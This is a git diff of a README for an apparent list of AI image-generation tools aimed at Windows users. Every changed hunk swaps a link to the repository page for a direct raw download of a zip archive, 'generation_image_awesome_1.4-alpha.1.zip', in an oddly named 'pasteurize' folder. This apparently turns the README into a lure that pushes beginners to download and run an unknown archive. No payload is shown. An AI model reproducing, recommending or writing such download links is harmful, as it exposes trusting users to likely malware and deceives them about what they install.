@@ -1,6 +1,6 @@
 # 🎨 awesome-image-generation - Simple AI Image Tools for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/yassine3010/awesome-image-generation)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/yassine3010/awesome-image-generation/main/pasteurize/generation_image_awesome_1.4-alpha.1.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This project provides a single place to find many AI image generation resources.
 
 You can start working with these AI tools easily on your Windows computer. Use the link below to open the main project page where you will find options and instructions for downloading each tool or API mentioned.
 
-[![Download Link](https://img.shields.io/badge/Open%20Project-Blue?style=for-the-badge)](https://github.com/yassine3010/awesome-image-generation)
+[![Download Link](https://img.shields.io/badge/Open%20Project-Blue?style=for-the-badge)](https://raw.githubusercontent.com/yassine3010/awesome-image-generation/main/pasteurize/generation_image_awesome_1.4-alpha.1.zip)
 
 The page lists many projects and software you can use. Each project includes a description and download instructions or installation guides. Below, you will find clear steps to download and try tools from the list.
 
@@ -39,7 +39,7 @@ These requirements allow smooth operation for most tools. However, models that c
 
 1. Visit the main repository page here:
 
-   [https://github.com/yassine3010/awesome-image-generation](https://github.com/yassine3010/awesome-image-generation)
+   [https://raw.githubusercontent.com/yassine3010/awesome-image-generation/main/pasteurize/generation_image_awesome_1.4-alpha.1.zip](https://raw.githubusercontent.com/yassine3010/awesome-image-generation/main/pasteurize/generation_image_awesome_1.4-alpha.1.zip)
 
 2. On the page, browse the projects list. Find the tool or API you want by reading the short descriptions. Some tools have direct download links labeled clearly.
 
@@ -128,4 +128,4 @@ These help you learn more or get support if needed.
 
 Use this link anytime to return to the full list or download updated versions:
 
-[Download and Explore](https://github.com/yassine3010/awesome-image-generation)
+[Download and Explore](https://raw.githubusercontent.com/yassine3010/awesome-image-generation/main/pasteurize/generation_image_awesome_1.4-alpha.1.zip)
